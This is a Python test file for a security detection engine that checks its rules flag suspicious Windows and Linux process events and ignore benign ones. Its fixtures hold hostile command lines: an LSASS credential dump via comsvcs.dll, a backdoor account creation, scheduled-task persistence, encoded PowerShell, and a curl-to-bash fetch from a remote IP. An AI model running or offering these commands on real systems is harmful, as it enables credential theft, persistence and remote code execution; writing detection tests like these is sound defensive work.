from blueforge.collectors import SampleCollector
from blueforge.detections.engine import DetectionEngine, load_rules
from blueforge.normalizer import normalize_many


def _matches(sysmon_log, sigma_dir):
    events = list(normalize_many(SampleCollector(sysmon_log).collect()))
    engine = DetectionEngine(load_rules(sigma_dir))
    return [m for e in events for m in engine.evaluate(e)]


def test_rules_load(sigma_dir):
    rules = load_rules(sigma_dir)
    assert len(rules) >= 8
    assert all(r.mitre for r in rules)  # every rule is MITRE-mapped
    assert len({r.id for r in rules}) == len(rules)  # no duplicate rule ids


def test_encoded_powershell_fires(sysmon_log, sigma_dir):
    titles = {m.detection.id for m in _matches(sysmon_log, sigma_dir)}
    assert "bf-0001" in titles  # encoded powershell
    assert "bf-0002" in titles  # certutil download
    assert "bf-0003" in titles  # whoami


def test_benign_notepad_does_not_fire_process_rules(sysmon_log, sigma_dir):
    # notepad.exe should never trip powershell/certutil/whoami rules
    for m in _matches(sysmon_log, sigma_dir):
        assert "notepad" not in (m.event.process or "")


def test_case_insensitive_matching(sigma_dir):
    from blueforge.normalizer import normalize

    engine = DetectionEngine(load_rules(sigma_dir))
    e = normalize(
        {
            "_source": "sysmon",
            "EventID": 1,
            "Image": "C:\\X\\POWERSHELL.EXE",
            "CommandLine": "POWERSHELL.EXE -ENC AAAA",
        }
    )
    ids = {m.detection.id for m in engine.evaluate(e)}
    assert "bf-0001" in ids


def _sysmon_event(image, command_line):
    from blueforge.normalizer import normalize

    return normalize(
        {"_source": "sysmon", "EventID": 1, "Image": image, "CommandLine": command_line}
    )


def test_schtasks_persistence_fires(sigma_dir):
    engine = DetectionEngine(load_rules(sigma_dir))
    e = _sysmon_event(
        "C:\\Windows\\System32\\schtasks.exe",
        'schtasks.exe /create /tn "Updater" /tr C:\\Users\\Public\\p.exe /sc onlogon',
    )
    assert "bf-0005" in {m.detection.id for m in engine.evaluate(e)}


def test_schtasks_query_does_not_fire(sigma_dir):
    # /query is benign admin usage; only /create is persistence
    engine = DetectionEngine(load_rules(sigma_dir))
    e = _sysmon_event("C:\\Windows\\System32\\schtasks.exe", "schtasks.exe /query /fo LIST")
    assert "bf-0005" not in {m.detection.id for m in engine.evaluate(e)}


def test_lsass_dump_fires(sigma_dir):
    engine = DetectionEngine(load_rules(sigma_dir))
    e = _sysmon_event(
        "C:\\Windows\\System32\\rundll32.exe",
        "rundll32.exe C:\\windows\\system32\\comsvcs.dll MiniDump 624 lsass.dmp full",
    )
    assert "bf-0006" in {m.detection.id for m in engine.evaluate(e)}


def test_net_user_add_fires(sigma_dir):
    engine = DetectionEngine(load_rules(sigma_dir))
    e = _sysmon_event("C:\\Windows\\System32\\net.exe", "net user backdoor P@ssw0rd123 /add")
    assert "bf-0007" in {m.detection.id for m in engine.evaluate(e)}


def test_curl_pipe_shell_fires_on_linux_process_event(sigma_dir):
    from blueforge.normalizer import normalize

    engine = DetectionEngine(load_rules(sigma_dir))
    e = normalize(
        {
            "_source": "linux",
            "timestamp": "2026-07-13T09:15:00",
            "host": "web01",
            "user": "www-data",
            "program": "bash",
            "command": "curl -s http://45.155.204.10/x.sh | bash",
        }
    )
    assert e.category.value == "process"  # command events normalize as process
    assert "bf-0008" in {m.detection.id for m in engine.evaluate(e)}


def test_plain_curl_download_does_not_fire_pipe_rule(sigma_dir):
    # Both clauses must match: a download WITHOUT the pipe-to-shell is not bf-0008
    from blueforge.normalizer import normalize

    engine = DetectionEngine(load_rules(sigma_dir))
    e = normalize(
        {
            "_source": "linux",
            "timestamp": "2026-07-13T09:16:00",
            "program": "bash",
            "command": "curl -sO https://mirror.csclub.uwaterloo.ca/ubuntu/pool/p.deb",
        }
    )
    assert "bf-0008" not in {m.detection.id for m in engine.evaluate(e)}
